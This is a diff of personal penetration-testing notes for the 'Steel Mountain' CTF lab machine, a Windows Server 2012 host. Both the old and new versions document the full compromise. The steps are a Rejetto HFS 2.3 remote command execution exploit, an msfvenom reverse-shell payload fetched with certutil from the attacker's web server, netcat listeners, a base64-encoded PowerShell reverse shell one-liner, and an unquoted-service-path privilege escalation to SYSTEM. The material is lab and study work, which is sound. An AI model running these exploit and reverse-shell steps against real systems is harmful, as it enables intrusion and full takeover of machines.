@@ -1,216 +1,34 @@
-## INFORMATION GATHERING
+## MACHINE IP
 ```bash
-# IP ADDRESS
-10.10.249.33
-# HOSTNAME // Found Post Initial foothold
-steelmountain
-# OPERATING SYSTEM // Found Post Initial foothold
-Host Name:                 STEELMOUNTAIN
-OS Name:                   Microsoft Windows Server 2012 R2 Datacenter
-OS Version:                6.3.9600 N/A Build 9600
-
-# CREDENTIALS  
+10.201.65.223
 ```
-## OPEN PORTS DETAILS
+## NMAP SCAN
 ```bash
-80/tcp    open  http          Microsoft IIS httpd 8.5
-8080/tcp  open  http          HttpFileServer httpd 2.3
-
-135/tcp   open  msrpc         Microsoft Windows RPC
-
-139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
-445/tcp   open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
-
-3389/tcp  open  ms-wbt-server Microsoft Terminal Services
-
-5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-
-47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-49152/tcp open  msrpc         Microsoft Windows RPC
-49153/tcp open  msrpc         Microsoft Windows RPC
-49154/tcp open  msrpc         Microsoft Windows RPC
-49155/tcp open  msrpc         Microsoft Windows RPC
-49156/tcp open  msrpc         Microsoft Windows RPC
-49164/tcp open  msrpc         Microsoft Windows RPC
-49165/tcp open  msrpc         Microsoft Windows RPC
-```
-# ENUMERATION
-## PORT 139 445 SMB 
-```bash
-# Recon
-SMB         10.10.249.33    445    STEELMOUNTAIN    [*] Windows Server 2012 R2 Datacenter 9600 x64 (name:STEELMOUNTAIN) (domain:steelmountain) (signing:False) (SMBv1:True)
-OS: Windows Server 2012 R2 Datacenter 9600
-OS version: '6.3'
-OS release: ''
-OS build: '9600'
-Native OS: Windows Server 2012 R2 Datacenter 9600
-Native LAN manager: Windows Server 2012 R2 Datacenter 6.3
-
-# Commands Used
-sudo nxc smb $ip 
-sudo nxc smb $ip --shares 
-sudo nxc smb $ip --shares -u '' -p ''
-sudo nxc smb $ip --shares -u '' -p '' --local-auth
-sudo smbclient -L $ip
-sudo smbmap -H $ip -R --depth 5
-sudo enum4linux-ng $ip
-sudo enum4linux -a $ip
-
-# Note 
-- No shares
-```
-## PORT 80
-```bash
-# Recon
-Summary   : HTTPServer[Microsoft-IIS/8.5], Microsoft-IIS[8.5]
-
-# Commands used
-sudo curl -I $url
-sudo whatweb -v $url
-
-# Note
-
-```
-## PORT 8080
-```bash
-# Recon
-Summary   : Cookies[HFS_SID], HTTPServer[HFS 2.3], HttpFileServer, JQuery[1.4.4], Script[text/javascript]
-
-# Commands used
-sudo curl -I $url
-sudo whatweb -v $url
-searchsploit HttpFileServer
-
-# Note
-- Found exploit for HttpFileServer 2.3 [HFS 2.3]
-windows/webapps/49125.py
-```
-## INITIAL FOOTHOLD
-```bash
-# Exploit 49125.py 
-python3 49125.py                                                
-Usage: python3 HttpFileServer_2.3.x_rce.py RHOST RPORT command
-list index out of range
-
-- Check If the exploit able to ping our machine
-sudo tcpdump -i tun0
-python3 49125.py 10.10.249.33 8080 'ping -c1 10.11.127.94'
-
-- Able to ping
-06:29:06.084725 IP 10.11.127.94.41782 > 10.10.249.33.http-alt: Flags [P.], seq 1:157, ack 1, win 502, options [nop,nop,TS val 3156788473 ecr 290931], length 156: HTTP: GET /?search=%00%7B.+exec%7Cping%20-c1%2010.11.127.94.%7D HTTP/1.1
-
-- Possible code execution 
-
-# Reverse shell
-- Generate Payload
-sudo msfvenom -p windows/x64/shell_reverse_tcp lhost=10.11.127.94 lport=445 -f exe -o shell.exe
-- Host it
-sudo python3 -m http.server 80
-- Reverse Shell
-sudo rlwrap nc -nvlp 445
-python3 49125.py 10.10.249.33 8080 "certutil.exe -f -urlcache http://10.11.127.94/shell.exe C:\Windows\Tasks\shell.exe"
-python3 49125.py 10.10.249.33 8080 "C:\Windows\Tasks\shell.exe" 
-
-connect to [10.11.127.94] from (UNKNOWN) [10.10.249.33] 49266
-Microsoft Windows [Version 6.3.9600]
-(c) 2013 Microsoft Corporation. All rights reserved.
-
-C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>whoami
-whoami
-steelmountain\bill
-
-# Upgrade shell to Powershell 
-- Edit Invoke-PowerShellTcp.ps1 with below
-Invoke-PowerShellTcp -Reverse -IPAddress 10.11.127.94 -Port 8080
-
-- Transfer Invoke-PowerShellTcp.ps1
-
-sudo rlwrap nc -nvlp 8080 
-C:\Windows\Tasks>powershell -ep bypass .\Invoke-PowerShellTcp.ps1
-```
-## PRIVILEGE ESCALATION
-```bash
--  Transfer PowerUp.ps1
-PS C:\Windows\Tasks> . .\PowerUp.ps1                                                          
-PS C:\Windows\Tasks> Invoke-AllChecks 
-
-- Found Service with Unquoted Service Path and Restartable Service
-ServiceName    : AdvancedSystemCareService9                                                   
-Path           : C:\Program Files (x86)\IObit\Advanced                                        
-                 SystemCare\ASCService.exe                                                    
-ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users;                       
-                 Permissions=AppendData/AddSubdirectory}                                      
-StartName      : LocalSystem                                                                  
-AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path                 
-                 <HijackPath>                                                                 
-CanRestart     : True                                                                         
-Name           : AdvancedSystemCareService9                                                   
-Check          : Unquoted Service Paths                           
-
-- Checking Folder Permission
-C:\Windows\Tasks>icacls  "C:\Program Files (x86)\IObit"
-icacls  "C:\Program Files (x86)\IObit"
-C:\Program Files (x86)\IObit STEELMOUNTAIN\bill:(OI)(CI)(RX,W)
-                             NT SERVICE\TrustedInstaller:(I)(F)
-                             NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)
-                             NT AUTHORITY\SYSTEM:(I)(F)
-                             NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
-                             BUILTIN\Administrators:(I)(F)
-                             BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
-                             BUILTIN\Users:(I)(RX)
-                             BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
-                             CREATOR OWNER:(I)(OI)(CI)(IO)(F)
-                             APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
-                             APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)
-
-# Privesc
-- Listener
-sudo rlwrap nc -nvlp 445
-
-- Exploit Method
-C:\Windows\Tasks>copy .\shell.exe "C:\Program Files (x86)\IObit\Advanced.exe"
-copy .\shell.exe "C:\Program Files (x86)\IObit\Advanced.exe"
-        1 file(s) copied.
-
-C:\Windows\Tasks>net stop AdvancedSystemCareService9
-net stop AdvancedSystemCareService9
-The Advanced SystemCare Service 9 service was stopped successfully.
-
-C:\Windows\Tasks>net start AdvancedSystemCareService9
-net start AdvancedSystemCareService9
-
-sudo rlwrap nc -nvlp 445
-[sudo] password for kali: 
-listening on [any] 445 ...
-connect to [10.11.127.94] from (UNKNOWN) [10.10.249.33] 49314
-Microsoft Windows [Version 6.3.9600]
-(c) 2013 Microsoft Corporation. All rights reserved.
-
-C:\Windows\system32>whoami
-whoami
-nt authority\system
-```
-# ENUMERATION OUTPUTS
-## NMAP
-```bash
-# Nmap 7.95 scan initiated Fri Feb  7 05:46:29 2025 as: /usr/lib/nmap/nmap -p 80,135,139,445,3389,5985,8080,47001,49152,49153,49154,49155,49156,49164,49165 -sC -sV -oN nmap/scan-script-version 10.10.249.33
-Nmap scan report for 10.10.249.33
-Host is up (0.17s latency).
-
+# Nmap 7.95 scan initiated Fri Sep  5 02:25:07 2025 as: /usr/lib/nmap/nmap -Pn -p- -sV -sC -v -T5 --open --min-rate 1500 --max-rtt-timeout 500ms --max-retries 3 -oN nmap/scan-script-version 10.201.65.223
+Nmap scan report for 10.201.65.223
+Host is up (0.30s latency).
+Not shown: 65520 closed tcp ports (reset)
 PORT      STATE SERVICE       VERSION
 80/tcp    open  http          Microsoft IIS httpd 8.5
 |_http-title: Site doesn't have a title (text/html).
 | http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
 |_  Potentially risky methods: TRACE
 |_http-server-header: Microsoft-IIS/8.5
 135/tcp   open  msrpc         Microsoft Windows RPC
 139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
 445/tcp   open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
 3389/tcp  open  ms-wbt-server Microsoft Terminal Services
-|_ssl-date: 2025-02-07T00:17:42+00:00; 0s from scanner time.
+|_ssl-date: 2025-09-04T20:57:07+00:00; 0s from scanner time.
 | ssl-cert: Subject: commonName=steelmountain
-| Not valid before: 2025-02-06T00:11:41
-|_Not valid after:  2025-08-08T00:11:41
+| Issuer: commonName=steelmountain
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha1WithRSAEncryption
+| Not valid before: 2025-09-03T20:44:26
+| Not valid after:  2026-03-05T20:44:26
+| MD5:   0752:bdaf:af13:f78c:4615:b69e:db35:2ba6
+|_SHA-1: b8eb:aee3:e98c:1186:eecc:b14d:00aa:3ff5:2b48:648d
 | rdp-ntlm-info: 
 |   Target_Name: STEELMOUNTAIN
 |   NetBIOS_Domain_Name: STEELMOUNTAIN
@@ -218,13 +36,16 @@ PORT      STATE SERVICE       VERSION
 |   DNS_Domain_Name: steelmountain
 |   DNS_Computer_Name: steelmountain
 |   Product_Version: 6.3.9600
-|_  System_Time: 2025-02-07T00:17:37+00:00
+|_  System_Time: 2025-09-04T20:57:02+00:00
 5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-|_http-server-header: Microsoft-HTTPAPI/2.0
 |_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
 8080/tcp  open  http          HttpFileServer httpd 2.3
+|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
 |_http-server-header: HFS 2.3
 |_http-title: HFS /
+| http-methods: 
+|_  Supported Methods: GET HEAD POST
 47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 |_http-title: Not Found
 |_http-server-header: Microsoft-HTTPAPI/2.0
@@ -233,8 +54,8 @@ PORT      STATE SERVICE       VERSION
 49154/tcp open  msrpc         Microsoft Windows RPC
 49155/tcp open  msrpc         Microsoft Windows RPC
 49156/tcp open  msrpc         Microsoft Windows RPC
-49164/tcp open  msrpc         Microsoft Windows RPC
-49165/tcp open  msrpc         Microsoft Windows RPC
+49185/tcp open  msrpc         Microsoft Windows RPC
+49186/tcp open  msrpc         Microsoft Windows RPC
 Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
 
 Host script results:
@@ -242,16 +63,237 @@ Host script results:
 |   3:0:2: 
 |_    Message signing enabled but not required
 | smb2-time: 
-|   date: 2025-02-07T00:17:36
-|_  start_date: 2025-02-07T00:11:31
-|_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02:db:18:5b:f9:e1 (unknown)
+|   date: 2025-09-04T20:56:59
+|_  start_date: 2025-09-04T20:43:22
+| nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 16:ff:dc:73:6e:ed (unknown)
+| Names:
+|   STEELMOUNTAIN<00>    Flags: <unique><active>
+|   WORKGROUP<00>        Flags: <group><active>
+|_  STEELMOUNTAIN<20>    Flags: <unique><active>
 | smb-security-mode: 
+|   account_used: guest
 |   authentication_level: user
 |   challenge_response: supported
 |_  message_signing: disabled (dangerous, but default)
 
+Read data files from: /usr/share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-# Nmap done at Fri Feb  7 05:47:43 2025 -- 1 IP address (1 host up) scanned in 73.26 seconds
-
+# Nmap done at Fri Sep  5 02:27:08 2025 -- 1 IP address (1 host up) scanned in 121.19 seconds
 ```
+## OPEN PORTS - ANALYSIS
+```bash
+# SMB
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
 
+# HTTP/HTTPS
+80/tcp    open  http          Microsoft IIS httpd 8.5
+8080/tcp  open  http          HttpFileServer httpd 2.3
+
+# RPC
+135/tcp   open  msrpc         Microsoft Windows RPC
+
+# RDP
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+
+# WINRM
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+
+# OTHERS
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+49152/tcp open  msrpc         Microsoft Windows RPC
+49153/tcp open  msrpc         Microsoft Windows RPC
+49154/tcp open  msrpc         Microsoft Windows RPC
+49155/tcp open  msrpc         Microsoft Windows RPC
+49156/tcp open  msrpc         Microsoft Windows RPC
+49185/tcp open  msrpc         Microsoft Windows RPC
+49186/tcp open  msrpc         Microsoft Windows RPC
+```
+## RECON
+```bash
+# Operating System
+Host Name:                 STEELMOUNTAIN
+OS Name:                   Microsoft Windows Server 2012 R2 Datacenter
+OS Version:                6.3.9600 N/A Build 9600                       
+```
+## ENUMERATION
+## PORT 8080 - HFS 2.3
+```bash
+# Checking exploit for HTTP File Server (HFS) 2.3
+sudo searchsploit hfs 2.3
+Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2) | windows/remote/39161.py
+
+# Mirror the exploit file
+sudo searchsploit -m windows/remote/39161.py
+
+# Checking the exploit script 
+EDB Note: You need to be using a web server hosting netcat (http://<attackers_ip>:80/nc.exe)
+
+- Seems like we need to host nc.exe on a web server while running the exploit
+- Change ip_addr and local_port to our machine ip and port 
+  
+# Host nc.exe on a server
+cp /usr/share/windows-resources/binaries/nc.exe .
+sudo python3 -m http.server 80
+
+# Start a Listener on the local port we changed
+sudo rlwrap nc -nvlp 53
+
+# Exploit Script Usage
+python2.7 39161.py 
+Usage is :[.] python exploit.py <Target IP address>  <Target Port Number>
+
+# Run the exploit script 
+python2.7 39161.py 10.201.65.223 8080
+```
+## INITIAL SHELL
+```bash
+sudo rlwrap nc -nvlp 53
+listening on [any] 53 ...
+connect to [10.13.80.25] from (UNKNOWN) [10.201.65.223] 49264
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>whoami
+whoami
+steelmountain\bill
+
+C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>ipconfig
+ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet 2:
+
+   Connection-specific DNS Suffix  . : ec2.internal
+   Link-local IPv6 Address . . . . . : fe80::bc09:b293:6d0a:7d3a%14
+   IPv4 Address. . . . . . . . . . . : 10.201.65.223
+   Subnet Mask . . . . . . . . . . . : 255.255.128.0
+   Default Gateway . . . . . . . . . : 10.201.0.1
+
+Tunnel adapter isatap.ec2.internal:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . : ec2.internal
+   
+# Improved Stable Shell
+sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.13.80.25 LPORT=53 -f exe -o rev.exe
+
+# Transfer + Start Listener + Improved Shell
+C:\Windows\Tasks>certutil -f -urlcache http://10.13.80.25/rev.exe C:\Windows\Tasks\rev.exe
+certutil -f -urlcache http://10.13.80.25/rev.exe C:\Windows\Tasks\rev.exe
+****  Online  ****
+CertUtil: -URLCache command completed successfully.
+
+sudo rlwrap nc -nvlp 53
+C:\Windows\Tasks>.\rev.exe
+
+# Get Proper Powershell Reverse Shell - https://www.revshells.com/
+powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAzAC4AOAAwAC4AMgA1ACIALAA1ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
+
+sudo rlwrap nc -nvlp 53
+```
+## PRIVILEGE ESCALATION
+```bash
+# Transfer PowerUp.ps1 and Invoke-AllChecks
+PS C:\Windows\Tasks> Import-Module .\PowerUp.ps1; Invoke-AllChecks
+
+# Modifiable Service with Unquoted Service Path
+ServiceName    : AdvancedSystemCareService9
+Path           : C:\Program Files (x86)\IObit\Advanced 
+                 SystemCare\ASCService.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; 
+                 Permissions=AppendData/AddSubdirectory}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path 
+                 <HijackPath>
+CanRestart     : True
+
+# Service Misconfiguration - Unquoted Service path
+- From cmd.exe Shell
+C:\Windows\Tasks>sc qc AdvancedSystemCareService9
+sc qc AdvancedSystemCareService9
+[SC] QueryServiceConfig SUCCESS
+SERVICE_NAME: AdvancedSystemCareService9
+        TYPE               : 110  WIN32_OWN_PROCESS (interactive)
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+        LOAD_ORDER_GROUP   : System Reserved
+        TAG                : 1
+        DISPLAY_NAME       : Advanced SystemCare Service 9
+        DEPENDENCIES       : 
+        SERVICE_START_NAME : LocalSystem
+  
+C:\Windows\Tasks>sc query AdvancedSystemCareService9
+sc query AdvancedSystemCareService9
+SERVICE_NAME: AdvancedSystemCareService9 
+        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
+        STATE              : 4  RUNNING 
+                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+  
+- Check Path C:\Program Files (x86)\IObit\Advanced SystemCare write permissions
+C:\Windows\Tasks>icacls "C:\Program Files (x86)\IObit\Advanced SystemCare"
+icacls "C:\Program Files (x86)\IObit\Advanced SystemCare"
+C:\Program Files (x86)\IObit\Advanced SystemCare STEELMOUNTAIN\bill:(I)(OI)(CI)(RX,W)
+                                                 NT SERVICE\TrustedInstaller:(I)(F)
+                                                 NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)
+                                                 NT AUTHORITY\SYSTEM:(I)(F)
+                                                 NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
+                                                 BUILTIN\Administrators:(I)(F)
+                                                 BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
+                                                 BUILTIN\Users:(I)(RX)
+                                                 BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
+                                                 CREATOR OWNER:(I)(OI)(CI)(IO)(F)
+                                                 APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
+                                                 APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)
+  
+- Can see that STEELMOUNTAIN\bill:(I)(OI)(CI)(RX,W) - got Read and Write permission on   "C:\Program Files (x86)\IObit\Advanced SystemCare" path
+
+C:\Windows\Tasks>copy C:\Windows\Tasks\rev.exe "C:\Program Files (x86)\IObit\Advanced.exe"
+copy C:\Windows\Tasks\rev.exe "C:\Program Files (x86)\IObit\Advanced.exe"
+        1 file(s) copied.
+
+- Start a Listener
+sudo rlwrap nc -nvlp 53
+
+- Stop and Start the service AdvancedSystemCareService9
+net stop AdvancedSystemCareService9    
+net start AdvancedSystemCareService9  
+```
+## ROOT | ADMINISTRATOR - PWNED
+```bash
+sudo rlwrap nc -nvlp 53                    
+listening on [any] 53 ...
+connect to [10.13.80.25] from (UNKNOWN) [10.201.65.223] 49307
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+C:\Windows\system32>ipconfig
+ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet 2:
+
+   Connection-specific DNS Suffix  . : ec2.internal
+   Link-local IPv6 Address . . . . . : fe80::bc09:b293:6d0a:7d3a%14
+   IPv4 Address. . . . . . . . . . . : 10.201.65.223
+   Subnet Mask . . . . . . . . . . . : 255.255.128.0
+   Default Gateway . . . . . . . . . : 10.201.0.1
+
+Tunnel adapter isatap.ec2.internal:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . : ec2.internal
+```
